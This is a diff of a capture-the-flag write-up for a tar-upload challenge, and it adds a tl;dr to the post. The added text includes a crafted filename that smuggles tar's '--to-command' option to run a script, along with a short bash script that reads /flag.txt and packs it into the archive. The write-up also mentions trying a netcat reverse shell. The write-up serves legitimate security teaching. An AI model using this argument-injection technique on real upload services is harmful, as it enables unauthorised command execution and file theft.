@@ -171,7 +171,8 @@ File change back to old name
 ```
 
 Hm, it says it cannot find test.tar. If we look at our input, it thinks that the filename is test.tar because there is a space after it. 
-Let's add an * to the end of test so that it will look for any file starting with test, and call tar on it.
+Let's add an * to the end of test so that it will look for any file starting with test, and call tar on it. 
+This will allow tar to grab the whole file while keeping spaces in the name
 
 `test* --to-command=cat test.txt .tar`
 
@@ -185,10 +186,11 @@ The only thing the tar inspector shows is the filenames.
 So I had to either reverse shell in, or add the flag to my tar file.
 
 I tried netcat, and got it to run without errors since the execution would pause while the netcat connection was running, bypassing whatever small errors were happening at the end of the tar input.
-However, I asked the admin and he told me that netcat was not installed on their instance. That wasn't going to work.
+However, I asked the admin and he told me that netcat was not installed on their instance. Netcat wasn't going to work.
 
-The only otion at this point was to add the file to my own tar file through a bash script.
+The only otion at this point was to add the flag to my own tar file through a bash script.
 
+&nbsp;
 
 Here was my initial bash script
 
@@ -312,3 +314,22 @@ utflag{bl1nd_c0mmand_1nj3ct10n?_n1c3_w0rk}
 When you upload the tar file, it actually gets uploaded! If you try to upload another file with the same name, it will error out because it already exists.
 You have to change the filename on each run for it to actually work.
 
+&nbsp;
+
+tl;dr 
+
+&nbsp;
+
+Filename of tar archive
+```
+exploit* --to-command=sh append.sh --mtime=*.tar
+```
+
+
+Script inside of the tar archive
+
+```
+var=$( cat /flag.txt )
+touch $var
+tar -rvf exploit* $var
+```
